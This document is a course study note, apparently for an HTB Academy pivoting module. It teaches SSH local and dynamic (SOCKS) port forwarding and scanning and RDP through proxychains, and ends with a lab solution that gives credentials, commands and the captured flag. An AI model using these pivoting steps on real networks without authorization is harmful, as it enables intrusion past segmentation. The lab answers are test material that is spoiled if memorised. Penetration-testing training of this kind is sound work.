# 03 — Dynamic Port Forwarding with SSH and SOCKS Tunneling

> SSH gives us three port-forwarding modes: `-L` (local), `-R` (remote), and `-D` (dynamic / SOCKS). This section nails Local + Dynamic — the bread-and-butter pivots.

---

## Port Forwarding in Context

**Port forwarding** redirects a connection from one TCP port to another. The transport is TCP (interactive, reliable), but the **encapsulation** can be SSH, SOCKS, HTTPS, etc. We use it to:

- bypass firewall/segmentation rules,
- reach services bound to `localhost` on a remote box,
- pivot through a compromised host into otherwise unreachable subnets.

Three SSH variants we'll use:

| Flag | Mode | Direction | Use case |
|------|------|-----------|----------|
| `-L lport:host:rport` | **Local** | attacker → pivot → target | bind a port on YOU, forward to a service reachable from the pivot |
| `-R rport:host:lport` | **Remote** | pivot → attacker | (covered later) |
| `-D port` | **Dynamic / SOCKS** | attacker → pivot → arbitrary | SOCKS proxy for ad-hoc enum (proxychains, browsers) |

---

## SSH Local Port Forwarding (`-L`)

### Scenario

- Attacker `10.10.15.5`
- Pivot Ubuntu server `10.129.202.64` (we have SSH creds)
- MySQL listens on the pivot's `127.0.0.1:3306` — invisible from the outside

We want to talk to MySQL from our attack box without first SSH-ing into the pivot interactively (e.g., to run a remote MySQL exploit).

### 1. Confirm port state on the pivot

```bash
nmap -sT -p22,3306 10.129.202.64
```

```
PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql       ← bound to localhost, not externally exposed
```

### 2. Open the local forward

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

This says: *"SSH server, every byte hitting `127.0.0.1:1234` on my box, deliver to `localhost:3306` from your perspective."*

### 3. Verify locally

```bash
netstat -antp | grep 1234
# tcp   0  0  127.0.0.1:1234   0.0.0.0:*   LISTEN   4034/ssh

nmap -v -sV -p1234 localhost
# 1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

The `mysql` service appears local to us — connect with `mysql -h 127.0.0.1 -P 1234`, run exploits, etc.

### 4. Forward multiple ports in one connection

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

`localhost:80` (Apache on the pivot) is now reachable at `http://127.0.0.1:8080` on our attack box.

### Useful flags to add

| Flag | Why |
|------|-----|
| `-N` | don't open a remote shell, just forward |
| `-f` | go to background after auth |
| `-T` | disable pseudo-tty allocation |
| `-g` | make the forwarded port reachable on all interfaces (not just `127.0.0.1`) |
| `-i key.pem` | use private key |

Common headless one-liner:

```bash
ssh -fNT -L 1234:localhost:3306 ubuntu@10.129.202.64
```

---

## Setting Up to Pivot — Look for Multiple NICs

Once on the pivot, inventory interfaces:

```bash
ifconfig         # or:  ip -br a
```

```
ens192:  inet 10.129.202.64   <- network back to us
ens224:  inet 172.16.5.129    <- internal network we want to reach
lo:      inet 127.0.0.1
```

> The `172.16.5.0/23` network on `ens224` is **only reachable through this pivot**. We can't scan it from our attack box because we have no route to it.

Solution: **dynamic port forwarding + a SOCKS proxy** so any tool on our box can reach that network through the pivot.

---

## SSH Dynamic Port Forwarding + SOCKS Tunneling (`-D`)

### What is SOCKS?

**SOCKS (Socket Secure)** is a proxy protocol that relays arbitrary TCP (and, in v5, UDP) traffic. The client speaks SOCKS to a SOCKS server, which opens the actual connection to the destination on the client's behalf. Two flavors:

| Version | Auth | UDP |
|---------|------|-----|
| **SOCKS4** | none | no |
| **SOCKS5** | yes (multiple methods) | yes |

SOCKS bypasses firewall/segmentation by terminating the user's traffic on the proxy and re-originating it from there. Perfect for pivoting.

### Open the SSH dynamic forward

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

This makes our local `127.0.0.1:9050` a **SOCKS server** that ships every connection over SSH to the pivot, which then dials the requested destination from inside the internal network.

### Configure proxychains

`/etc/proxychains.conf` — last block declares the chain:

```bash
tail -4 /etc/proxychains.conf
# ...
# defaults set to "tor"
socks4  127.0.0.1 9050
```

Add `socks5 127.0.0.1 9050` if your tunnel is SOCKS5 (Chisel/Ligolo speak SOCKS5; SSH `-D` is SOCKS5 capable too — proxychains auto-handles both with the right config line). Standard config flags:

```
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks4 127.0.0.1 9050
```

### Use proxychains with any TCP tool

```bash
# Subnet sweep through the pivot
proxychains nmap -v -sn 172.16.5.1-200

# Single-host TCP connect scan (pin the host with -Pn; ICMP doesn't tunnel)
proxychains nmap -v -Pn -sT 172.16.5.19
```

Output shows the SOCKS chain in use:

```
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
Discovered open port 445/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
```

### Critical proxychains rules — memorize

1. **Full TCP connect scan only** (`-sT`). Half-open (`-sS`) and SYN scans send malformed packets the proxy won't relay → bogus results.
2. **`-Pn` always.** ICMP (ping) does not tunnel through SOCKS. Without `-Pn`, Nmap declares hosts dead before scanning.
3. **No UDP** through SOCKS4. Only SOCKS5 supports UDP, and many tools still won't use it correctly.
4. **Windows hosts** typically firewall ICMP by default — another reason for `-Pn`.
5. **TCP connect scans across a /23 are slow.** Scan a single host or a small known-alive range.

---

## Pivoting Metasploit Through the SOCKS Proxy

Run msfconsole through proxychains so its modules use the same tunnel:

```bash
proxychains msfconsole
```

```
msf6 > search rdp_scanner
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 > set rhosts 172.16.5.19
msf6 > run
[*] 172.16.5.19:3389 - Detected RDP on 172.16.5.19:3389 (name:DC01) (os_version:10.0.17763) (Requires NLA: No)
```

> Tip: `Requires NLA: No` means the host accepts plain RDP credentials — easy to test logins through the tunnel.

---

## RDP Through the Tunnel — `xfreerdp` via Proxychains

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore /dynamic-resolution
```

Lab creds for this section: `victor : pass@123`. Accept the cert prompt and you get a desktop session pivoted through the Ubuntu server.

---

## Quick-Reference Commands

```bash
# Local forward — single port
ssh -L 1234:localhost:3306 ubuntu@PIVOT

# Local forward — multiple ports, headless background
ssh -fNT -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@PIVOT

# Dynamic forward (SOCKS) — interactive
ssh -D 9050 ubuntu@PIVOT

# Dynamic forward (SOCKS) — headless background
ssh -fNT -D 127.0.0.1:9050 ubuntu@PIVOT

# Common proxychains commands once SOCKS is up
proxychains nmap -Pn -sT -p- 172.16.5.19
proxychains msfconsole
proxychains xfreerdp /v:HOST /u:USER /p:PASS /cert:ignore
proxychains smbclient -L //172.16.5.19/ -U user
proxychains crackmapexec smb 172.16.5.0/23 -u U -p P
proxychains curl http://172.16.5.19/
```

---

## STUCK? Triage

| Symptom | Fix |
|---------|-----|
| `nmap` reports everything dead | drop ICMP — add `-Pn`; use `-sT` not `-sS` |
| Half-open scan returns wrong ports | proxychains can't relay raw SYN — use `-sT` |
| Scan crawls forever | `/23` over a tunnel is slow; pick known-alive single hosts |
| `xfreerdp` cert prompt loops | add `/cert:ignore` |
| `proxychains: Permission denied` | check that SSH `-D` is actually listening: `ss -tlnp \| grep 9050` |
| Tool ignores proxychains | tool re-execs in another process or uses raw sockets — try `proxychains4` or run via `socat` |
| DNS lookups leak (or fail) | enable `proxy_dns` in `/etc/proxychains.conf`; use IP literals when in doubt |
| `Connection refused` on remote port | service binds only to a different IP (e.g., `0.0.0.0:0` vs `127.0.0.1`) — confirm with `ss -tlnp` on the pivot |

---

## Lab Solution — Section 3 Skills (May 8, 2026)

**Target:** `10.129.91.231` (ACADEMY-PIVOTING-LINUXPIV) — Linux pivot
**Internal target:** `172.16.5.19` (Windows, DC01)
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`
**Internal creds:** `victor : pass@123`

### Q1 — How many NICs on the pivot? → **3**

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 'ip -br a'
# lo      UNKNOWN  127.0.0.1/8
# ens192  UP       10.129.91.231/16   <- external (our VPN side)
# ens224  UP       172.16.5.129/23    <- internal pivot subnet
```

### Q2 — Flag from `victor`'s Desktop on `172.16.5.19` → **`N1c3Piv0t`**

Full chain:

```bash
# 1. Open SOCKS5 tunnel through the pivot (background, no shell, no TTY)
sshpass -p 'HTB_@cademy_stdnt!' \
    ssh -fNT -o StrictHostKeyChecking=no \
        -D 127.0.0.1:9050 ubuntu@10.129.91.231

# 2. Confirm tunnel is listening locally
ss -tlnp | grep 9050
# LISTEN 0 128 127.0.0.1:9050  ...  users:(("ssh",pid=...,fd=4))

# 3. Verify proxychains config (Kali ships /etc/proxychains4.conf, not proxychains.conf)
tail -3 /etc/proxychains4.conf
# socks4  127.0.0.1 9050

# 4. Test connectivity to the Windows target through the tunnel
proxychains4 -q nmap -Pn -sT -n -p 3389,445 172.16.5.19
#   (ports may show "filtered" through SOCKS — false negative; proceed anyway)

# 5. SMB to C$ as victor (he's local admin) — fastest path, no GUI needed
proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
    -c 'ls Users\victor\Desktop\*'
#   flag.txt.txt   A   9  Mon May  2 13:48:39 2022

proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
    -c 'get Users\victor\Desktop\flag.txt.txt -'
# N1c3Piv0t

# 6. Tear down the tunnel when finished
pkill -f 'ssh -fNT.*9050'
```

Alternative (GUI) instead of step 5:

```bash
proxychains4 xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' \
    /cert:ignore /dynamic-resolution
# read flag.txt.txt off the desktop
```

### Lessons learned this lab

- The flag file was named `flag.txt.txt` (Windows hidden-extension trick) — `Flag.txt` per the prompt does **not** exist verbatim; always `ls` the Desktop first.
- On Kali the proxychains config lives at `/etc/proxychains4.conf`, not `/etc/proxychains.conf` (HTB module references the older path).
- `nmap -sT` through SOCKS reported `filtered` for both 445 and 3389 — don't trust SOCKS scan results, just **try the actual service**.
- Going SMB-only avoids the X11/RDP overhead. RDP over SOCKS is laggy; SMB through proxychains is snappy when the user has admin.
- Never run `nmap -sS` or anything that needs raw sockets through proxychains — it'll lie or crash.

---

## Key Takeaways

1. `-L` brings a remote service **to** your loopback — perfect for hitting things bound to `127.0.0.1` on a pivot.
2. `-D` makes your loopback a **SOCKS proxy** through the pivot — perfect for ad-hoc enum across an unknown internal subnet.
3. `proxychains` + SOCKS5 is the universal "make any TCP tool pivot" trick.
4. Always `-Pn -sT` through proxychains. Always.
5. Multi-NIC pivot = your gateway to internal LAN. `ifconfig` first, `ssh -D` second.

---

## References

- Previous: [02-Networking_Behind_the_Scenes.md](02-Networking_Behind_the_Scenes.md)
- Next: [04-Remote_Remote_Port_Forwarding_with_SSH_Meterpreter.md](04-Remote_Remote_Port_Forwarding_with_SSH_Meterpreter.md)
- Proxychains-NG: <https://github.com/rofl0r/proxychains-ng>
- SSH man page: `man ssh` (search `-L`, `-R`, `-D`)
